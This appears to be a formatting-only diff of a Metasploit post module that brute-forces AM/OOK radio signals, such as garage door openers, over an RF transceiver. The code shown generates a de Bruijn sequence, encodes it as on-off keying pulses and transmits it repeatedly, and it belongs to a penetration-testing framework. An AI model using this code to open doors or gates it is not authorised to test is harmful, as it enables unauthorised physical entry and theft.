@@ -6,18 +6,22 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::Hardware::RFTransceiver::RFTransceiver
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Brute Force AM/OOK (ie: Garage Doors)',
-        'Description'   => %q{ Post Module for HWBridge RFTranscievers.  Brute forces AM OOK or raw
-                               binary signals.  This is a port of the rfpwnon tool by Corey Harding.
-                               (https://github.com/exploitagency/github-rfpwnon/blob/master/rfpwnon.py)
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Brute Force AM/OOK (ie: Garage Doors)',
+        'Description' => %q{
+          Post Module for HWBridge RFTranscievers.  Brute forces AM OOK or raw
+          binary signals.  This is a port of the rfpwnon tool by Corey Harding.
+          (https://github.com/exploitagency/github-rfpwnon/blob/master/rfpwnon.py)
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => ['Craig Smith'],
-        'Platform'      => ['hardware'],
-        'SessionTypes'  => ['hwbridge']
-      ))
+        'License' => MSF_LICENSE,
+        'Author' => ['Craig Smith'],
+        'Platform' => ['hardware'],
+        'SessionTypes' => ['hwbridge']
+      )
+    )
     register_options([
       OptInt.new('FREQ', [true, "Frequency to transmit on"]),
       OptInt.new('BAUD', [false, "Baud rate to use", 2000]),
@@ -48,31 +52,31 @@ class MetasploitModule < Msf::Post
       when "1"
         x = @onepwm
       when "2"
-       x = @twopwm
+        x = @twopwm
       end
       pwm_str_key += x
     end
-    return pwm_str_key.scan(/.{1,8}/).collect{|x| x.to_i(2).chr}
+    return pwm_str_key.scan(/.{1,8}/).collect { |x| x.to_i(2).chr }
   end
 
   def debruijn_bytes(k, n)
-    @a=[0]
+    @a = [0]
     @sequence = []
     debruijn(1, 1, k, n)
     return @sequence.join
   end
 
   def debruijn(t, p, k, n)
-    if t>n
-      if n%p==0
-        1.upto(p) {|j| @sequence<<@a[j]}
+    if t > n
+      if n % p == 0
+        1.upto(p) { |j| @sequence << @a[j] }
       end
     else
-      @a[t]=@a[t-p]
-      debruijn(t+1, p, k, n)
-      (@a[t-p]+1).upto(k-1) {|j|
-        @a[t]=j
-        debruijn(t+1, t, k, n)
+      @a[t] = @a[t - p]
+      debruijn(t + 1, p, k, n)
+      (@a[t - p] + 1).upto(k - 1) { |j|
+        @a[t] = j
+        debruijn(t + 1, t, k, n)
       }
     end
   end
@@ -101,7 +105,7 @@ class MetasploitModule < Msf::Post
 
     print_status("Generating de bruijn sequence...")
     seq = debruijn_bytes(@brutechar.length, datastore['BINLENGTH'])
-    tail = seq[0, datastore['BINLENGTH']-1]
+    tail = seq[0, datastore['BINLENGTH'] - 1]
     brutepacket = seq + tail
 
     print_status("Brute forcing frequency: #{datastore['FREQ']}")
@@ -123,14 +127,15 @@ class MetasploitModule < Msf::Post
     end
     # Transmit
     while startn < brutepacket.length
-      (0..datastore['REPEAT']-1).each do |i|
-        brutepackettemp = brutepacket[startn..endy-1]
+      (0..datastore['REPEAT'] - 1).each do |i|
+        brutepackettemp = brutepacket[startn..endy - 1]
         next if brutepackettemp.length < datastore['BINLENGTH']
+
         # Pad if asked to
         brutepackettemp = datastore['PPAD'] + brutepackettemp if datastore['PPAD']
         brutepackettemp += datastore['TPAD'] if datastore['TPAD']
         if datastore['RAW']
-          key_packed = brutepackettemp.scan(/.{1,8}/).collect{|x| x.to_i(2).chr}
+          key_packed = brutepackettemp.scan(/.{1,8}/).collect { |x| x.to_i(2).chr }
         else
           key_packed = convert_ook(brutepackettemp)
         end
